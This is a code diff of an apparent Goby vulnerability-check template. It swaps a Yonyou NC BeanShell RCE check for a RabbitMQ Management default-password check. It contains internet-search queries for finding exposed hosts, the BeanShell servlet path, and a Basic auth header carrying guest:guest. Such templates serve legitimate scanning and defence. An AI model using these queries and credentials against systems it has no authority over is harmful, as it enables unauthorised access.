@@ -6,14 +6,14 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "RabbitMQ Management Default Password",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
+  "FofaQuery": "app=\"RabbitMQ-Management\" || product=\"RabbitMQ-Management\"",
+  "GobyQuery": "app=\"RabbitMQ-Management\" || product=\"RabbitMQ-Management\"",
   "Level": "3",
   "Impact": "",
   "Recommendation": "",
@@ -30,9 +30,12 @@ func init() {
     {
       "Request": {
         "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "uri": "/api/whoami",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "content-type": "application/json",
+          "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
+        },
         "data_type": "text",
         "data": ""
       },
@@ -51,7 +54,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "\"name\":\"guest\"",
             "bz": ""
           }
         ]
@@ -107,7 +110,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "RabbitMQ Management Default Password",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +119,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "RabbitMQ Management Default Password",
       "Product": "",
       "Description": "",
       "Recommendation": "",
